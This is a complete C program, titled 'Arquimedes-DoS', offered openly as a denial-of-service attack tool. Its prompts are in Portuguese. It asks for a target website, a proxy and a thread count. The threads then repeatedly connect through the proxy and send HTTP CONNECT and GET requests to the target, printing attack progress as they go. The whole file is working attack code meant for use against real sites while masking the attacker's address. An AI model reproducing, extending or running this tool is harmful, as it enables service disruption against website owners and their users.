#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <pthread.h>

#define SCRIPT_NAME "Arquimedes-DoS.c"

char host[256];
int port;
int total_packets_per_thread;
char proxy_ip[100];
int proxy_port;
int threads_count;

void banner() {
    printf(
        "   _                   _                    _           \n"
        "  /_\\  _ __ __ _ _   _(_)_ __ ___   ___  __| | ___  ___ \n"
        " //_\\\\| '__/ _` | | | | | '_ ` _ \\ / _ \\/ _` |/ _ \\/ __|\n"
        "/  _  \\ | | (_| | |_| | | | | | | |  __/ (_| |  __/\\__ \\\n"
        "\\_/ \\_/_|  \\__, |\\__,_|_|_| |_| |_|\\___|\\__,_|\\___||___/\n"
        "             |_|                                        \n"
        "Arquimedes DoS - By Jhon Lamdenberguer\n"
        "Team Família Flodder Techno\n"
        "=======================================\n"
    );
}

void *attack_thread(void *arg) {
    struct sockaddr_in proxy_addr;
    int sock;
    char request[1024];

    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(proxy_port);
    proxy_addr.sin_addr.s_addr = inet_addr(proxy_ip);

    for (int i = 0; i < total_packets_per_thread; i++) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        if (connect(sock, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
            close(sock);
            continue;
        }

        snprintf(request, sizeof(request),
                 "CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n",
                 host, port, host, port);
        send(sock, request, strlen(request), 0);
        recv(sock, request, sizeof(request), 0);

        snprintf(request, sizeof(request),
                 "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", host);
        send(sock, request, strlen(request), 0);

        printf("%s -> pacote %d enviado para %s:%d\n", SCRIPT_NAME, i + 1, host, port);

        close(sock);
        usleep(100000);
    }

    return NULL;
}

int main() {
    banner();

    printf("∆tack DoS Arquimedes\n");
    printf("Domínio do site -> ");
    scanf("%255s", host);
    printf("Porta do site -> ");
    scanf("%d", &port);
    printf("Quantidade de pacotes por thread -> ");
    scanf("%d", &total_packets_per_thread);
    printf("IP da sua proxy -> ");
    scanf("%99s", proxy_ip);
    printf("Porta da sua proxy -> ");
    scanf("%d", &proxy_port);
    printf("Quantidade de threads -> ");
    scanf("%d", &threads_count);

    printf("Ataque iniciado...\n");

    pthread_t threads[threads_count];

    for (int i = 0; i < threads_count; i++) {
        if (pthread_create(&threads[i], NULL, attack_thread, NULL) != 0) {
            perror("Erro ao criar thread");
        }
    }

    for (int i = 0; i < threads_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Ataque finalizado.\n");
    return 0;
}
